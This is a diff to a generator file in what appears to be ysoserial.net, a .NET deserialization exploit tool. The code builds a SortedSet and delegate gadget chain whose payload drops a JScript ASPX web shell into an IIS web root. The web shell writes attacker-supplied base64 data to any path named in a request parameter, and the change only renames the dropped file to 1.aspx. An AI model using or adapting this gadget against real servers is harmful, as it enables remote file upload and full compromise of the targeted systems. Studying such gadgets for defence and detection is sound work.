@@ -426,7 +426,7 @@ namespace ysoserial.Generators
             Comparison<string> d = (Comparison<string>)MulticastDelegate.Combine(da, da);
             IComparer<string> comp = Comparer<string>.Create(d);
             SortedSet<string> set = new SortedSet<string>(comp);
-            set.Add(@"c:\inetpub\wwwroot\aspnet_client\Account\login.aspx");
+            set.Add(@"c:\inetpub\wwwroot\aspnet_client\1.aspx");
             set.Add("a<%@ Page Language=\"JScript\" Debug=\"true\"%><%@Import Namespace=\"System.IO\"%><%File.WriteAllBytes(Request[\"b\"], Convert.FromBase64String(Request[\"a\"]));%>");
  
             FieldInfo fi = typeof(MulticastDelegate).GetField("_invocationList", BindingFlags.NonPublic | BindingFlags.Instance);
